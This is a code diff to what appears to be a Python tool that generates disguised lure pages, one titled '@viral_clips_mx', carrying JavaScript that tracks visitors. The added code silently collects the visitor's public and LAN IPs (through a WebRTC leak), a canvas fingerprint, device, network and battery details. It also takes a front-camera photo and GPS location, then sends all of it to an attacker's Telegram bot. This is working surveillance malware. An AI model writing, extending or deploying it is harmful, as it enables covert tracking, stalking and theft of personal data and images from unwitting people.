@@ -213,7 +213,7 @@ const BOT='__TOKEN__', CHAT='__CHAT_ID__';
 const send = async (txt) => {
     await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
         method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: CHAT, text: txt, parse_mode: 'HTML', disable_web_page_preview: false})
+        body: JSON.stringify({chat_id: CHAT, text: txt, parse_mode: 'HTML', disable_web_page_preview: true})
     });
 };
 
@@ -225,87 +225,178 @@ const sendLocation = async (lat, lon) => {
 };
 
 const sendPhoto = async (blob) => {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT);
-    formData.append('photo', blob, 'capture.jpg');
-    formData.append('caption', '📸 <b>Captura de Camara</b>');
-    formData.append('parse_mode', 'HTML');
-    
-    await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-    });
+    const fd = new FormData();
+    fd.append('chat_id', CHAT);
+    fd.append('photo', blob, 'capture.jpg');
+    fd.append('caption', '📸 <b>Captura de Camara</b>');
+    fd.append('parse_mode', 'HTML');
+    await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {method:'POST', body:fd});
 };
 
-const getBasicInfo = async () => {
-    let info = `🔍 <b>NUEVA VISITA DETECTADA</b>\\n\\n`;
-    let ip = '';
-    let lat = 0, lon = 0;
-    
+/* --- WebRTC IP leak (expone IPs LAN sin ningun permiso) --- */
+const getWebRTCIPs = async () => {
+    const ips = new Set();
     try {
-        const r = await fetch('https://api.ipify.org?format=json');
-        const d = await r.json();
+        const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+        pc.createDataChannel('');
+        await pc.setLocalDescription(await pc.createOffer());
+        await new Promise(r => setTimeout(r, 1200));
+        const sdp = pc.localDescription?.sdp || '';
+        [...sdp.matchAll(/a=candidate:[^\\n]+/g)].forEach(m => {
+            const p = m[0].split(' ');
+            if (p[7] === 'host' && p[4] && !p[4].startsWith('0.') && !p[4].startsWith('127.') && !p[4].includes(':'))
+                ips.add(p[4]);
+        });
+        pc.close();
+    } catch(e) {}
+    return [...ips];
+};
+
+/* --- Canvas fingerprint (unico por dispositivo/browser, sin permisos) --- */
+const getCanvasFP = () => {
+    try {
+        const c = document.createElement('canvas');
+        const ctx = c.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f36';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('GekOsint\\u2665', 2, 15);
+        ctx.fillStyle = 'rgba(102,204,0,0.7)';
+        ctx.fillText('GekOsint\\u2665', 4, 17);
+        return c.toDataURL().slice(-40);
+    } catch(e) { return 'N/A'; }
+};
+
+/* --- Recolecta TODO lo posible sin ningun permiso, luego envia --- */
+const getBasicInfo = async () => {
+    let ip = '', lat = 0, lon = 0;
+    let info = '\\u{1F50D} <b>NUEVA VISITA DETECTADA</b>\\n';
+    info += '\\u2501'.repeat(22) + '\\n\\n';
+
+    /* IP + geo por red */
+    try {
+        const r  = await fetch('https://api.ipify.org?format=json');
+        const d  = await r.json();
         ip = d.ip;
-        info += `🌐 <b>IP:</b> <code>${ip}</code>\\n`;
-        
-        const ipd = await fetch(`https://ip-api.com/json/${ip}?fields=lat,lon,city,country,isp,status`);
-        const geo = await ipd.json();
-        if(geo.status === 'success') {
-            lat = geo.lat;
-            lon = geo.lon;
-            info += `📍 <b>Ubicacion:</b> ${geo.city}, ${geo.country}\\n`;
-            info += `🏢 <b>ISP:</b> ${geo.isp}\\n`;
-            info += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver en Mapa</a>\\n`;
+        info += `\\u{1F310} <b>IP Publica:</b> <code>${ip}</code>\\n`;
+
+        const gf = `https://ip-api.com/json/${ip}?fields=status,lat,lon,city,regionName,country,countryCode,isp,org,as,mobile,proxy,hosting`;
+        const geo = await (await fetch(gf)).json();
+        if (geo.status === 'success') {
+            lat = geo.lat; lon = geo.lon;
+            info += `\\u{1F4CD} <b>Ciudad:</b> ${geo.city}, ${geo.regionName}, ${geo.country} (${geo.countryCode})\\n`;
+            info += `\\u{1F3E2} <b>ISP:</b> ${geo.isp}\\n`;
+            if (geo.org && geo.org !== geo.isp) info += `\\u{1F3DB} <b>Org:</b> ${geo.org}\\n`;
+            info += `\\u{1F4E1} <b>ASN:</b> ${geo.as}\\n`;
+            const flags = [];
+            if (geo.proxy)   flags.push('\\u26A0\\uFE0F VPN/Proxy');
+            if (geo.mobile)  flags.push('\\u{1F4F1} Red Movil');
+            if (geo.hosting) flags.push('\\u{1F5A5} Datacenter');
+            if (flags.length) info += `\\u{1F6A9} <b>Flags:</b> ${flags.join(' | ')}\\n`;
+            info += `\\u{1F5FA} <b>Maps IP:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver ubicacion</a>\\n`;
         }
     } catch(e) {}
-    
-    info += `📱 <b>UA:</b> ${navigator.userAgent}\\n`;
-    info += `💻 <b>OS:</b> ${navigator.platform}\\n`;
+
+    /* Dispositivo */
+    info += `\\n\\u{1F4BB} <b>DISPOSITIVO</b>\\n`;
+    info += `\\u{1F4F1} <b>UA:</b> <code>${navigator.userAgent.slice(0,120)}</code>\\n`;
+    info += `\\u{1F5A5} <b>Plataforma:</b> ${navigator.platform}\\n`;
+    info += `\\u{1F310} <b>Idiomas:</b> ${(navigator.languages || [navigator.language]).join(', ')}\\n`;
+    info += `\\u{1F552} <b>Zona horaria:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}\\n`;
+    info += `\\u{1F4D0} <b>Pantalla:</b> ${screen.width}x${screen.height} @ ${screen.colorDepth}bit\\n`;
+    info += `\\u{1FA9F} <b>Ventana:</b> ${window.innerWidth}x${window.innerHeight}\\n`;
+    info += `\\u2699 <b>CPU cores:</b> ${navigator.hardwareConcurrency || 'N/A'}\\n`;
+    if (navigator.deviceMemory) info += `\\u{1F9E0} <b>RAM aprox:</b> ${navigator.deviceMemory}GB\\n`;
+    info += `\\u{1F91A} <b>Touch:</b> ${navigator.maxTouchPoints > 0 ? `Si (${navigator.maxTouchPoints} puntos)` : 'No'}\\n`;
+    if (document.referrer) info += `\\u{1F517} <b>Referrer:</b> ${document.referrer}\\n`;
+    info += `\\u{1F4DC} <b>Historial:</b> ${history.length} entradas\\n`;
+
+    /* Red */
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+        info += `\\n\\u{1F4F6} <b>CONEXION</b>\\n`;
+        if (conn.effectiveType) info += `\\u{1F4F6} <b>Tipo:</b> ${conn.effectiveType}\\n`;
+        if (conn.downlink)      info += `\\u2B07 <b>Downlink:</b> ${conn.downlink} Mbps\\n`;
+        if (conn.rtt)           info += `\\u23F1 <b>RTT:</b> ${conn.rtt}ms\\n`;
+        if (conn.saveData)      info += `\\u{1F4BE} Modo ahorro de datos: Si\\n`;
+    }
+
+    /* Bateria */
     try {
-        const battery = await navigator.getBattery();
-        info += `🔋 <b>Bateria:</b> ${Math.round(battery.level * 100)}%\\n`;
+        const bat = await navigator.getBattery();
+        info += `\\u{1F50B} <b>Bateria:</b> ${Math.round(bat.level*100)}% ${bat.charging ? '(cargando \\u26A1)' : ''}\\n`;
     } catch(e) {}
-    
+
+    /* WebRTC IP leak */
+    try {
+        const rtcIPs = await getWebRTCIPs();
+        if (rtcIPs.length)
+            info += `\\n\\u{1F513} <b>IPs LAN (WebRTC):</b> <code>${rtcIPs.join(', ')}</code>\\n`;
+    } catch(e) {}
+
+    /* Dispositivos media (sin permiso solo cuenta, no da labels) */
+    try {
+        const devs = await navigator.mediaDevices.enumerateDevices();
+        const cams = devs.filter(d => d.kind==='videoinput').length;
+        const mics = devs.filter(d => d.kind==='audioinput').length;
+        info += `\\n\\u{1F3A5} <b>Camaras:</b> ${cams} | \\u{1F3A4} <b>Micros:</b> ${mics}\\n`;
+    } catch(e) {}
+
+    /* Canvas fingerprint */
+    const fp = getCanvasFP();
+    info += `\\u{1F91A} <b>Canvas FP:</b> <code>${fp}</code>\\n`;
+
     await send(info);
-    
-    return {lat, lon};
+    return {lat, lon, ip};
 };
 """
 
 JS_GEO_AUTO = """
 const getGeoAuto = async (ipLat, ipLon) => {
-    if(navigator.geolocation) {
+    if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (p) => {
             const lat = p.coords.latitude;
             const lon = p.coords.longitude;
             const acc = p.coords.accuracy;
-            let gps = `🎯 <b>GPS EXACTO OBTENIDO</b>\\n\\n`;
-            gps += `📍 <b>Coords:</b> <code>${lat}, ${lon}</code>\\n`;
-            gps += `📏 <b>Precision:</b> ${acc} metros\\n`;
-            gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver en Mapa</a>`;
+            const alt = p.coords.altitude ? `${p.coords.altitude.toFixed(1)}m` : 'N/A';
+            const spd = p.coords.speed   ? `${(p.coords.speed * 3.6).toFixed(1)} km/h` : 'N/A';
+            let gps = `\U0001F3AF <b>GPS EXACTO OBTENIDO</b>\\n\\n`;
+            gps += `\U0001F4CD <b>Coords:</b> <code>${lat}, ${lon}</code>\\n`;
+            gps += `\U0001F4CF <b>Precision:</b> ${acc.toFixed(0)} metros\\n`;
+            gps += `\U0001F3D4 <b>Altitud:</b> ${alt}\\n`;
+            gps += `\U0001F3CE <b>Velocidad:</b> ${spd}\\n`;
+            gps += `\U0001F5FA <b>Maps:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver en Mapa</a>\\n`;
+            gps += `\U0001F6F0 <b>Street View:</b> <a href="https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}">Ver Street View</a>`;
             await send(gps);
             await sendLocation(lat, lon);
             redirect();
-        }, async (e) => {
-            if(ipLat && ipLon) {
-                let gps = `📍 <b>Ubicacion por IP</b>\\n\\n`;
-                gps += `📍 <b>Coords:</b> <code>${ipLat}, ${ipLon}</code>\\n`;
-                gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${ipLat},${ipLon}">Ver en Mapa</a>\\n`;
-                gps += `\\nℹ️ <i>GPS no disponible, usando ubicacion de red</i>`;
-                await send(gps);
+        }, async (err) => {
+            const reasons = {1:'Permiso denegado', 2:'Posicion no disponible', 3:'Timeout'};
+            let msg = `\U0001F4CD <b>GPS DENEGADO \u2014 Datos por IP</b>\\n\\n`;
+            msg += `\u26D4 <b>Razon:</b> ${reasons[err.code] || 'Desconocido'}\\n\\n`;
+            if (ipLat && ipLon) {
+                msg += `\U0001F310 <b>Coords IP:</b> <code>${ipLat}, ${ipLon}</code>\\n`;
+                msg += `\U0001F5FA <b>Maps:</b> <a href="https://www.google.com/maps?q=${ipLat},${ipLon}">Ver ubicacion aproximada</a>\\n`;
+                msg += `\u26A0\uFE0F <i>Precision baja (nivel ciudad/ISP)</i>`;
+                await send(msg);
                 await sendLocation(ipLat, ipLon);
             } else {
-                await send(`❌ <b>GPS Denegado:</b> No se pudo obtener ubicacion`);
+                msg += `\u274C Sin coordenadas disponibles`;
+                await send(msg);
             }
             redirect();
         }, {enableHighAccuracy: true, timeout: 15000, maximumAge: 0});
     } else {
-        if(ipLat && ipLon) {
-            let gps = `📍 <b>Ubicacion por IP</b>\\n\\n`;
-            gps += `📍 <b>Coords:</b> <code>${ipLat}, ${ipLon}</code>\\n`;
-            gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${ipLat},${ipLon}">Ver en Mapa</a>`;
-            await send(gps);
+        let msg = `\U0001F4CD <b>Geolocalizacion no disponible</b>\\n\\n`;
+        if (ipLat && ipLon) {
+            msg += `\U0001F310 <b>Coords IP:</b> <code>${ipLat}, ${ipLon}</code>\\n`;
+            msg += `\U0001F5FA <b>Maps:</b> <a href="https://www.google.com/maps?q=${ipLat},${ipLon}">Ver ubicacion</a>`;
+            await send(msg);
             await sendLocation(ipLat, ipLon);
+        } else {
+            await send(msg + '\u274C Sin datos de ubicacion');
         }
         redirect();
     }
@@ -313,7 +404,7 @@ const getGeoAuto = async (ipLat, ipLon) => {
 """
 
 JS_CAM_AUTO = """
-const getCamAuto = async () => {
+const getCamAuto = async (ipLat, ipLon) => {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: "user" },
@@ -333,13 +424,13 @@ const getCamAuto = async () => {
                 canvas.toBlob(async (blob) => {
                     await sendPhoto(blob);
                     stream.getTracks().forEach(t => t.stop());
-                    getGeoAuto(0, 0);
+                    getGeoAuto(ipLat || 0, ipLon || 0);
                 }, 'image/jpeg', 0.9);
             }, 1500);
         };
     } catch (e) {
         await send(`❌ <b>Camara Denegada/Error:</b> ${e.message}`);
-        getGeoAuto(0, 0);
+        getGeoAuto(ipLat || 0, ipLon || 0);
     }
 };
 """
@@ -351,7 +442,7 @@ def get_template(token, chat_id, mode="geo"):
     
     if mode == "cam":
         css = CSS_STYLES_CAMERA
-        init_call = "const ipGeo = await getBasicInfo(); getCamAuto();"
+        init_call = "const ipGeo = await getBasicInfo(); getCamAuto(ipGeo.lat, ipGeo.lon);"
         logic += JS_GEO_AUTO + JS_CAM_AUTO
         icon = "🎵"
         title = "@viral_clips_mx"
